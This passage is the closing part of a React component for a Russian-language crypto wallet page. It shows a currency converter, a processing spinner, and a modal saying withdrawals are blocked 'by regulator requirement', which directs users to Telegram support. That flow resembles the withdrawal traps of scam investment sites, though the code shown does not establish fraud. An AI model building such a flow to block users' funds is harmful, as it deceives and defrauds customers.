                                        <select value={convertTo} onChange={e => setConvertTo(e.target.value)} className="bg-transparent text-sm font-semibold outline-none">
                                            <option value="USDT">USDT</option>
                                            <option value="RUB">RUB</option>
                                            <option value="BTC">BTC</option>
                                            <option value="ETH">ETH</option>
                                        </select>
                                    </div>
                                </div>
                                <div className="text-2xl font-bold text-[#00C896]">{getConvertedAmount()}</div>
                            </div>

                            <div className="text-center text-xs text-gray-500">
                                Курс: 1 {convertFrom} = {rates[`${convertFrom}_${convertTo}`] || '—'} {convertTo}
                            </div>
                        </div>
                    </div>
                </div>
            )}

            {/* Processing Modal */}
            {activeModal === 'processing' && (
                <div className="fixed inset-0 z-[100] flex items-center justify-center px-4">
                    <div className="absolute inset-0 bg-black/90 backdrop-blur-sm"></div>
                    <div className="bg-[#1c1c1e] w-full max-w-sm rounded-3xl border border-gray-700/50 relative z-10 p-8 animate-[scaleIn_0.2s_ease-out]">
                        <div className="flex flex-col items-center text-center">
                            <div className="w-16 h-16 border-4 border-[#0098EA] border-t-transparent rounded-full animate-spin mb-4"></div>
                            <h3 className="text-lg font-bold mb-2">Обработка запроса</h3>
                            <p className="text-sm text-gray-400">Проверяем данные для вывода средств...</p>
                        </div>
                    </div>
                </div>
            )}

            {/* Withdraw Error Modal */}
            {activeModal === 'withdraw-error' && (
                <div className="fixed inset-0 z-[100] flex items-center justify-center px-4">
                    <div className="absolute inset-0 bg-black/90 backdrop-blur-sm" onClick={closeModal}></div>
                    <div className="bg-[#1c1c1e] w-full max-w-sm rounded-3xl border border-gray-700/50 relative z-10 p-6 animate-[scaleIn_0.2s_ease-out]">
                        <div className="flex flex-col items-center text-center">
                            <div className="w-16 h-16 rounded-full bg-[#FF3B30]/20 flex items-center justify-center mb-4">
                                <AlertCircle size={32} className="text-[#FF3B30]" />
                            </div>
                            
                            <h3 className="text-lg font-bold mb-2">Вывод невозможен</h3>
                            
                            <p className="text-sm text-gray-400 mb-4 leading-relaxed">
                                Вывод средств возможен только на те реквизиты, с которых производилось пополнение счета.
                            </p>

                            <div className="w-full bg-[#111113] rounded-xl p-4 mb-4 border border-gray-800">
                                <div className="flex items-start gap-3 text-left">
                                    <AlertCircle size={18} className="text-[#0098EA] mt-0.5 shrink-0" />
                                    <div className="text-xs text-gray-400">
                                        Это требование регулятора для предотвращения отмывания денег и обеспечения безопасности ваших средств.
                                    </div>
                                </div>
                            </div>

                            <p className="text-sm text-gray-300 mb-6">
                                Для вывода средств обратитесь в службу поддержки
                            </p>

                            <div className="flex gap-2 w-full">
                                <button 
                                    onClick={closeModal}
                                    className="flex-1 bg-[#2c2c2e] text-white font-semibold py-3 rounded-xl active:scale-[0.98] border border-gray-700"
                                >
                                    Закрыть
                                </button>
                                <a 
                                    href={`https://t.me/${settings.support_username?.replace('@', '')}`}
                                    target="_blank"
                                    rel="noopener noreferrer"
                                    className="flex-1 bg-[#0098EA] text-white font-semibold py-3 rounded-xl active:scale-[0.98] flex items-center justify-center gap-2"
                                >
                                    Поддержка
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
};

export default WalletPage;
